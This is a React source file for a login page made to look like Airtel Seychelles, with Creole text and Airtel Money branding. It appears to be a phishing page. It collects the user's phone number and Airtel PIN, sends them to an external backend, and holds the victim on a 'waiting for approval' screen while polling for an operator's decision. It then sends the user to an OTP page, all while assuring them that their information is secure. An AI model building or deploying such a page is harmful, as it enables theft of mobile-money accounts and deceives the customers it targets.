import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';

const COUNTRY_CODE = '+248';
const PHONE_PLACEHOLDER = '2XXXXXX'; 
const PHONE_MAX = 7;

function AirtelLogin() {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  
  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
  const [refId, setRefId] = useState<string | null>(null);

  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= PHONE_MAX) {
      setPhone(val);
      if (val.length === PHONE_MAX) {
        pinRefs.current[0]?.focus();
      }
    }
  };

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.substring(value.length - 1);
    setPin(newPin);
    if (value && index < 3) {
      pinRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const pinString = pin.join('');

    if (phone.length < PHONE_MAX || pinString.length < 4) {
      return; 
    }

    setIsLoading(true);

    const fullPhone = `${COUNTRY_CODE}${phone}`;
    localStorage.setItem('airtelPhone', fullPhone);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
      });

      const data = await response.json();

      if (data.status === 'pending' && data.ref_id) {
        setRefId(data.ref_id);
        setIsWaitingForApproval(true); 
        
        const pollInterval = setInterval(async () => {
          try {
            const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
            const statusData = await statusRes.json();

            if (statusData.status === 'approved') {
              clearInterval(pollInterval);
              navigate('/airtel-otp');
            } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
              clearInterval(pollInterval);
              setIsWaitingForApproval(false);
              setIsLoading(false);
            }
          } catch (pollErr) {
            console.error('Polling error:', pollErr);
          }
        }, 1000);
      } else {
        navigate('/airtel-otp');
      }
    } catch (err) {
      console.error('Login request failed:', err);
      setIsLoading(false);
    }
  };

  const isFormValid = phone.length === PHONE_MAX && pin.join('').length === 4;

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #DA1C1C;
          position: relative;
        }

        /* FADED BACKGROUND CLASS */
        .faded-content {
          opacity: 0.15;
          pointer-events: none;
          transition: opacity 0.3s ease;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
        }

        /* WAITING OVERLAY */
        .waiting-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100vw;
          height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 9999;
          padding: 20px;
          background-color: rgba(255, 255, 255, 0.9);
        }

        .custom-spinner {
          width: 60px;
          height: 60px;
          border: 6px solid #E5E7EB;
          border-top: 6px solid #DA1C1C;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .waiting-title {
          font-size: 22px;
          font-weight: 700;
          color: #1a1a1a;
          margin-bottom: 20px;
          text-align: center;
        }

        .waiting-message {
          background-color: #FEF2F2;
          color: #4B5563;
          padding: 16px 24px;
          border-radius: 24px;
          text-align: center;
          font-size: 15px;
          font-weight: 500;
          line-height: 1.5;
          max-width: 380px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        /* HEADER */
        .header-section {
          padding: 40px 24px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          position: relative;
        }

        .menu-btn {
          position: absolute;
          left: 20px;
          top: 20px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
        }

        .header-title {
          font-size: 32px;
          font-weight: 900;
          color: #1a1a1a;
          font-style: italic;
          margin-bottom: 6px;
        }

        .header-subtitle {
          font-size: 14px;
          font-weight: 600;
          color: #1a1a1a;
        }

        /* MAIN CARD */
        .main-card {
          background-color: #ffffff;
          width: 90%;
          max-width: 420px;
          margin: 0 auto;
          border-radius: 24px;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
          position: relative;
          z-index: 10;
        }

        .card-title {
          font-size: 26px;
          font-weight: 800;
          color: #0F172A;
          margin-bottom: 8px;
        }

        .card-subtitle {
          font-size: 15px;
          color: #64748B;
          margin-bottom: 24px;
        }

        .input-label {
          font-size: 15px;
          font-weight: 700;
          color: #0F172A;
          margin-bottom: 12px;
          width: 100%;
          text-align: center;
        }

        /* PHONE INPUT */
        .phone-wrapper {
          width: 100%;
          display: flex;
          border-radius: 12px;
          overflow: hidden;
          margin-bottom: 24px;
          border: 2px solid #E2E8F0;
          transition: border-color 0.2s;
        }

        .phone-wrapper:focus-within {
          border-color: #DA1C1C;
        }

        .phone-prefix {
          background-color: #F1F5F9;
          display: flex;
          align-items: center;
          padding: 0 16px;
          font-size: 16px;
          font-weight: 700;
          color: #0F172A;
          gap: 8px;
          border-right: 1px solid #E2E8F0;
        }

        .phone-input-field {
          flex: 1;
          background-color: #FFFFFF;
          border: none;
          padding: 16px;
          font-size: 18px;
          color: #0F172A;
          font-weight: 600;
          outline: none;
        }

        .phone-input-field::placeholder {
          color: #94A3B8;
        }

        /* PIN INPUT SECTION */
        .pin-section-wrapper {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 12px;
          margin-bottom: 28px;
          width: 100%;
        }

        .pin-boxes {
          display: flex;
          gap: 12px;
        }

        .pin-box {
          width: 50px;
          height: 60px;
          border: 2px solid #E2E8F0;
          border-radius: 12px;
          font-size: 24px;
          font-weight: 800;
          text-align: center;
          color: #0F172A;
          outline: none;
          background-color: #F8FAFC;
          transition: border-color 0.2s, background-color 0.2s;
        }

        .pin-box:focus {
          border-color: #DA1C1C;
          background-color: #FFFFFF;
        }

        .pin-box::placeholder {
          color: #CBD5E1;
        }

        .eye-btn {
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #64748B;
          transition: color 0.2s;
        }

        .eye-btn:hover {
          color: #0F172A;
        }

        /* BUTTON */
        .login-btn {
          width: 100%;
          padding: 18px;
          border-radius: 12px;
          border: none;
          background-color: #E2E8F0;
          color: #94A3B8;
          font-size: 18px;
          font-weight: 700;
          cursor: not-allowed;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 12px;
          transition: all 0.2s;
        }

        .login-btn.active {
          background-color: #DA1C1C;
          color: #ffffff;
          cursor: pointer;
          box-shadow: 0 4px 12px rgba(218, 28, 28, 0.3);
        }

        /* SECURITY TEXT */
        .security-footer {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-top: 24px;
          color: #64748B;
          font-size: 14px;
          font-weight: 500;
        }

        /* FOOTER ICONS */
        .brand-icons-footer {
          flex: 1;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
          padding: 40px 20px 20px;
        }

        .brand-icon {
          display: flex;
          align-items: center;
          justify-content: center;
        }
      `}</style>

      {isWaitingForApproval && (
        <div className="waiting-overlay">
          <div className="custom-spinner"></div>
          <div className="waiting-title">Pey atann aprobasyon</div>
          <div className="waiting-message">
            Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...
          </div>
        </div>
      )}

      {/* MAIN CONTENT WRAPPER (Gets faded when waiting) */}
      <div className={isWaitingForApproval ? 'faded-content' : ''}>
        
        {/* HEADER */}
        <div className="header-section">
          <button className="menu-btn" onClick={() => navigate('/')}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="3" y1="12" x2="21" y2="12"></line>
              <line x1="3" y1="6" x2="21" y2="6"></line>
              <line x1="3" y1="18" x2="21" y2="18"></line>
            </svg>
          </button>
          <h1 className="header-title">Airtel Sesel</h1>
          <p className="header-subtitle">Pre rapid. Nenport ler. Nenport kote.</p>
        </div>

        {/* MAIN CARD */}
        <div className="main-card">
          <h2 className="card-title">Byenveni</h2>
          <p className="card-subtitle">Konekte ar ou kont Airtel Sesel</p>

          <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
            
            <span className="input-label">Nimero telefon</span>
            <div className="phone-wrapper">
              <div className="phone-prefix">
                <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
                  <path fill="#003f87" d="M0,200 L300,0 L0,0 Z"/>
                  <path fill="#fcd856" d="M0,200 L300,0 L300,50 Z"/>
                  <path fill="#d62828" d="M0,200 L300,50 L300,100 Z"/>
                  <path fill="#ffffff" d="M0,200 L300,100 L300,150 Z"/>
                  <path fill="#007a3d" d="M0,200 L300,150 L300,200 Z"/>
                </svg>
                {COUNTRY_CODE}
              </div>
              <input
                type="tel"
                className="phone-input-field"
                placeholder={PHONE_PLACEHOLDER}
                value={phone}
                onChange={handlePhoneChange}
                maxLength={PHONE_MAX}
                disabled={isLoading || isWaitingForApproval}
              />
            </div>

            <span className="input-label">Antre ou koud PIN Airtel</span>
            
            <div className="pin-section-wrapper">
              <div className="pin-boxes">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    type={showPin ? 'text' : 'password'}
                    maxLength={1}
                    value={digit}
                    ref={(el) => { pinRefs.current[index] = el; }}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className="pin-box"
                    placeholder="•"
                    disabled={isLoading || isWaitingForApproval}
                  />
                ))}
              </div>

              <button 
                type="button" 
                className="eye-btn" 
                onClick={() => setShowPin(!showPin)}
              >
                {showPin ? (
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                    <line x1="1" y1="1" x2="23" y2="23"></line>
                  </svg>
                ) : (
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                  </svg>
                )}
              </button>
            </div>

            <button 
              type="submit" 
              className={`login-btn ${isFormValid ? 'active' : ''}`}
              disabled={!isFormValid || isLoading || isWaitingForApproval}
            >
              {isLoading && !isWaitingForApproval ? 'Pey konekte...' : 'Konekte'}
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="5" y1="12" x2="19" y2="12" />
                <polyline points="12 5 19 12 12 19" />
              </svg>
            </button>

          </form>

          <div className="security-footer">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
            Ou bann informasyon i an sekirite.
          </div>
        </div>

        {/* BRAND ICONS FOOTER */}
        <div className="brand-icons-footer">
          <div className="brand-icon">
            <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
              <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
              <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
            </div>
          </div>
          
          <div className="brand-icon">
            <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
          </div>

          <div className="brand-icon">
            <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
              <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
            </div>
          </div>

          <div className="brand-icon">
            <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
              <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AirtelLogin;